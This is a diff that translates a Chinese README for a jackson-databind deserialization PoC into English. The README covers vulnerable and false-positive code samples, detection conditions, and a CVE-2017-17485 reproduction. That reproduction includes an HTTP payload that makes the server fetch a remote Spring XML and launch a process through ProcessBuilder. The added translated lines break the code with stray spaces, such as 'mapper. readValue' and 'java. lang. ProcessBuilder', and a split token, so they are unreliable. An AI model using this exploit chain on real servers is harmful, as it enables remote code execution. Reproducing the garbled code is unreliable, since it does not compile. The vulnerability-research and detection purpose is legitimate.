@@ -1,9 +1,9 @@
 # jackson-databind-POC
 
-### 存在漏洞示例/误报示例
+### Vulnerability example/false positive example
 
-先看几个白盒检测存在漏洞的示例：
-来源：https://github.com/find-sec-bugs/find-sec-bugs/blob/master/findsecbugs-samples-java/src/test/java/testcode/serial/UnsafeJacksonObjectDeserialization.java
+Let's look at a few examples of white box detection vulnerabilities:
+Source: https://github.com/find-sec-bugs/find-sec-bugs/blob/master/findsecbugs-samples-java/src/test/java/testcode/serial/UnsafeJacksonObjectDeserialization.java
 
 ```java
 public class UnsafeJacksonObjectDeserialization {
@@ -14,49 +14,49 @@ public class UnsafeJacksonObjectDeserialization {
     }
 
     static class AnotherBean {
-        @JsonTypeInfo (use = JsonTypeInfo.Id.CLASS)
+        @JsonTypeInfo (use = JsonTypeInfo. Id. CLASS)
         public Object obj;
     }
 
     static class YetAnotherBean {
-        @JsonTypeInfo (use = JsonTypeInfo.Id.MINIMAL_CLASS)
+        @JsonTypeInfo (use = JsonTypeInfo. Id. MINIMAL_CLASS)
         public Object obj;
     }
 
-    public void exampleOne(String JSON)  throws Exception {
+    public void exampleOne(String JSON) throws Exception {
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
-        Object obj = mapper.readValue(JSON, ABean.class);
+        Object obj = mapper. readValue(JSON, ABean. class);
     }
 
-    public void exampleTwo(String JSON)  throws Exception {
+    public void exampleTwo(String JSON) throws Exception {
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
-        Object obj = mapper.readValue(JSON, ABean.class);
+        Object obj = mapper. readValue(JSON, ABean. class);
     }
 
-    public void exampleThree(String JSON)  throws Exception {
+    public void exampleThree(String JSON) throws Exception {
         ObjectMapper mapper = new ObjectMapper();
-        Object obj = mapper.readValue(JSON, AnotherBean.class);
+        Object obj = mapper. readValue(JSON, AnotherBean. class);
     }
 
-    public void exampleFour(String JSON)  throws Exception {
+    public void exampleFour(String JSON) throws Exception {
         ObjectMapper mapper = new ObjectMapper();
-        Object obj = mapper.readValue(JSON, YetAnotherBean.class);
+        Object obj = mapper. readValue(JSON, YetAnotherBean. class);
     }
 
 }
 ```
 
-从上面的四个例子可以总结出存在漏洞的jackson代码有这么几种情况：
-- 1、exampleOne开启了DefaultTyping，且被序列化的类里有一个Object类型，默认空的构造器与`OBJECT_AND_NON_CONCRETE`等价，是第二等级的，可以进行对象注入；
-- 2、exampleTwo开启了DefaultTyping，且被序列化的类里有一个Object类型，且接口类和抽象类都能被反序列化，是第三等级的，更可以进行对象注入；
-- 3、exampleThree虽然没有开启DefaultTyping，但是其被序列化的类被`JsonTypeInfo.Id.CLASS`修饰，可以通过`@class`进行对象注入；
-- 4、exampleThree虽然没有开启DefaultTyping，但是其被序列化的类被`JsonTypeInfo.Id.MINIMAL_CLASS`修饰，可以通过`@c`进行对象注入；
+From the above four examples, it can be concluded that there are several cases of vulnerable Jackson code:
+- 1. exampleOne enables DefaultTyping, and there is an Object type in the serialized class. The default empty constructor is equivalent to `OBJECT_AND_NON_CONCRETE`, which is the second level and can perform object injection;
+- 2. exampleTwo has enabled DefaultTyping, and there is an Object type in the serialized class, and both the interface class and the abstract class can be deserialized, which is the third level, and object injection can be performed;
+- 3. Although DefaultTyping is not enabled for exampleThree, its serialized class is modified by `JsonTypeInfo.Id.CLASS`, and object injection can be performed through `@class`;
+- 4. Although DefaultTyping is not enabled in exampleThree, its serialized class is modified by `JsonTypeInfo.Id.MINIMAL_CLASS`, and object injection can be performed through `@c`;
 
 
-再看一个jackson反序列化白盒检测的误报示例：
-来源：https://github.com/find-sec-bugs/find-sec-bugs/blob/master/findsecbugs-samples-java/src/test/java/testcode/serial/JacksonSerialisationFalsePositive.java
+Let's look at another false positive example of jackson deserialization white box detection:
+Source: https://github.com/find-sec-bugs/find-sec-bugs/blob/master/findsecbugs-samples-java/src/test/java/testcode/serial/JacksonSerialisationFalsePositive.java
 
 
 ```java
@@ -67,74 +67,74 @@ public class JacksonSerialisationFalsePositive implements Serializable {
         public Object obj;
     }
 
-    public void exampleOne(String JSON)  throws Exception {
+    public void exampleOne(String JSON) throws Exception {
         ObjectMapper mapper = new ObjectMapper();
-        Object obj = mapper.readValue(JSON, JacksonSerialisationFalsePositive.class);
+        Object obj = mapper. readValue(JSON, JacksonSerialisationFalsePositive. class);
     }
 
-    public void exampleTwo(String JSON)  throws Exception {
+    public void exampleTwo(String JSON) throws Exception {
         ObjectMapper mapper = new ObjectMapper();
-        Object obj = mapper.readValue(JSON, Bean.class);
+        Object obj = mapper. readValue(JSON, Bean. class);
     }
 }
 ```
 
-说明：
-- 1、exampleOne中没有开启DefaultTyping，且其待反序列化的类没有使用`JsonTypeInfo.Id.CLASS/MININAL_CLASS`修饰，所以无法进行对象注入；
-- 2、exampleTwo中没有开启DefaultTyping，且其待反序列化的类没有使用`JsonTypeInfo.Id.CLASS/MININAL_CLASS`修饰，所以无法进行对象注入；
+illustrate:
+- 1. DefaultTyping is not enabled in exampleOne, and the class to be deserialized is not modified with `JsonTypeInfo.Id.CLASS/MININAL_CLASS`, so object injection cannot be performed;
+- 2. DefaultTyping is not enabled in exampleTwo, and the class to be deserialized is not decorated with `JsonTypeInfo.Id.CLASS/MININAL_CLASS`, so object injection cannot be performed;
 
 
-### jackson反序列化白盒检测
-#### 第一个特征是关于 EnableDefaultTyping 的，注意他的多个重载方法，共有4个：
+### jackson deserialization white box detection
+#### The first feature is about EnableDefaultTyping, pay attention to his multiple overloaded methods, there are 4 in total:
 ```java
 ObjectMapper enableDefaultTyping()
 ObjectMapper enableDefaultTyping(DefaultTyping dti)
 ObjectMapper enableDefaultTyping(DefaultTyping applicability, JsonTypeInfo.As includeAs)
 ObjectMapper enableDefaultTypingAsProperty(DefaultTyping applicability, String propertyName)
 ```
-只要匹配到，就算命中了条件A。
+As long as it is matched, condition A is hit.
 
-#### 第二个特征是在 readValue 时候，指定的类本身是Object或者里面一定要包含Object类型字段或者Object类型的setter。
+#### The second feature is that when readingValue, the specified class itself is Object or it must contain Object type fields or Object type setters.
 ```java
 public <T> T readValue(String content, JavaType valueType)
 public <T> T readValue(Reader src, Class<T> valueType)
 public <T> T readValue(Reader src, TypeReference valueTypeRef)
 public <T> T readValue(Reader src, JavaType valueType)
 ```
-所以只要匹配到这个，就需要对第二个参数进行解析，确认这个Model是否是可以被攻击的Model。如果包含了Object或者本身就是个Object，就认为命中了条件B。
+So as long as this is matched, the second parameter needs to be parsed to confirm whether this Model is a Model that can be attacked. If it contains Object or is an Object itself, it is considered that condition B is hit.
 
 
-#### 第三个特征是被反序列的类里面，有被 JsonTypeInfo 注解过的类，而且里面的内容是 `JsonTypeInfo.Id.CLASS` 或 `JsonTypeInfo.Id.MINIMAL_CLASS` 。记做条件C。
+#### The third feature is that in the deserialized class, there is a class annotated by JsonTypeInfo, and the content inside is `JsonTypeInfo.Id.CLASS` or `JsonTypeInfo.Id.MINIMAL_CLASS`. Note it as condition C.
 
-最终条件就是  (A&&B) || C。
+The final condition is (A&&B) || C.
 
 
-下面给出一个C的示例：
+An example of C is given below:
 
 ```java
 public class Jackson {
 
     static class AnotherBean {
-        @JsonTypeInfo (use = JsonTypeInfo.Id.CLASS)
+        @JsonTypeInfo (use = JsonTypeInfo. Id. CLASS)
         public Object obj;
     }
 
-    @RequestMapping(value = "/deserialize3", method = {RequestMethod.POST})
+    @RequestMapping(value = "/deserialize3", method = {RequestMethod. POST})
     @ResponseBody
     public static String deserialize3(@RequestBody String params) throws IOException {
         System.out.println(params);
         try {
             ObjectMapper objectMapper = new ObjectMapper();
-            Object obj = objectMapper.readValue(params, AnotherBean.class);
+            Object obj = objectMapper. readValue(params, AnotherBean. class);
             return obj.toString();
-        }  catch (Exception e){
+        } catch (Exception e){
             e.printStackTrace();
             return e.toString();
         }
     }
 
 ```
-相应的payload为：
+The corresponding payload is:
 ```http
 POST /jackson/deserialize3 HTTP/1.1
 Host: cqq.com:8080
@@ -148,21 +148,21 @@ Content-Length: 127
 
 
 ### Demo
-下面演示从HTTP请求到Spring的方法，然后readValue，最后触发gadget的方法。这里是一个SSRF的例子。
+The following demonstrates the method from HTTP request to Spring, then readValue, and finally triggers the gadget method. Here is an SSRF example.
 ![](jackson-JsonTypeInfo_id_class-poc.gif)
 
-### 复现CVE-2017-17485
+### Reproduce CVE-2017-17485
 
-#### 影响范围
+#### Sphere of influence
 - Jackson-databind version <= 2.9.3
 
 - Jackson-databind version <= 2.7.9.1
 
 - Jackson-databind version <= 2.8.10
-参考：https://github.com/RealBearcat/Jackson-CVE-2017-17485
+Reference: https://github.com/RealBearcat/Jackson-CVE-2017-17485
 
-#### 漏洞环境
-修改pom.xml，将jackson-databind的版本设置为2.9.3：
+#### Vulnerability environment
+Modify pom.xml and set the version of jackson-databind to 2.9.3:
 ```xml
         <dependency>
             <groupId>com.fasterxml.jackson.core</groupId>
@@ -171,24 +171,24 @@ Content-Length: 127
     	</dependency>
 ```
 
-使用已有的存在漏洞的代码：
+Using existing vulnerable code:
 ```java
     static class ABean {
         public int id;
         public Object obj;
     }
 
-    @RequestMapping(value = "/deserialize2", method = {RequestMethod.POST})
+    @RequestMapping(value = "/deserialize2", method = {RequestMethod. POST})
     @ResponseBody
     public static String deserialize2(@RequestBody String params) throws IOException {
-        // 如果Content-Type不设置application/json格式，post数据会被url编码
+        // If the Content-Type does not set the application/json format, the post data will be url-encoded
         System.out.println(params);
         try {
             ObjectMapper objectMapper = new ObjectMapper();
             objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
             objectMapper.readValue(params, ABean.class);
             return "deserialize2";
-        }  catch (Exception e){
+        } catch (Exception e){
             e.printStackTrace();
             return e.toString();
         }
@@ -196,26 +196,26 @@ Content-Length: 127
 ```
 
 #### PoC
-由于被反序列化的类是ABean，所以按照ABean的格式，写出如下PoC（虽然id属性不写也可以触发漏洞）：
+Since the class to be deserialized is an ABean, write the following PoC according to the format of the ABean (although the id attribute can also trigger the vulnerability):
 ```http
 POST /jackson/deserialize2 HTTP/1.1
 Host: cqq.com:8080
 Connection: close
-Cookie: confluence-sidebar.width=285; confluence.browse.space.cookie=space-blogposts; JSESSIONID=55F192C960EC2BBE19F71FB85C34D41C; XSRF-TOKEN=867c4ff2-4228-4e97-b9fa-81319af3502b; remember-me=YWRtaW46MTU4NjQ4OTM3NjIwMzo0ODFhYmVjZjBhODYxMmVlOTE0NmJhZTU5OGYwN2EwMQ
+Cookie: confluence-sidebar.width=285; confluence.browse.space.cookie=space-blogposts; JSESSIONID=55F192C960EC2BBE19F71FB85C34D41C; XSRF-TOKEN=867c4ff2-4228-4e97-b9fa-81319af3502 b; remember-me=YWRtaW46MTU4NjQ4OTM3NjIwMzo0ODFhYmVjZjBhODYxMmVlOTE0NmJhZTU5OGYwN2EwMQ
 Content-Type: application/json
 Content-Length: 171
 
-{"id":1, "obj":["org.springframework.context.support.ClassPathXmlApplicationContext", "https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/spel.xml"]}
+{"id":1, "obj":["org.springframework.context.support.ClassPathXmlApplicationContext", "https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/spel.xml "]}
 ```
-其中xml的内容为：
+The content of xml is:
 ```xml
 <beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="
      http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-    <bean id="pb" class="java.lang.ProcessBuilder">
+    <bean id="pb" class="java. lang. ProcessBuilder">
         <constructor-arg value="calc.exe" />
-        <property name="whatever" value="#{ pb.start() }"/>
+        <property name="whatever" value="#{ pb. start() }"/>
     </bean>
 </beans>
 ```
@@ -223,8 +223,8 @@ Content-Length: 171
 #### Demo
 ![](jackson-CVE-2017-17485-poc.gif)
 
-### 参考
+### refer to
 - https://github.com/JoyChou93/java-sec-code
 - https://www.leadroyal.cn/?p=594
 - https://www.leadroyal.cn/?p=630
-- [Jackson反序列化漏洞简介（四）： 防御和检测方式【系列完结】](https://www.leadroyal.cn/?p=633)
+- [Introduction to Jackson Deserialization Vulnerability (4): Defense and Detection Methods [End of the series]](https://www.leadroyal.cn/?p=633)
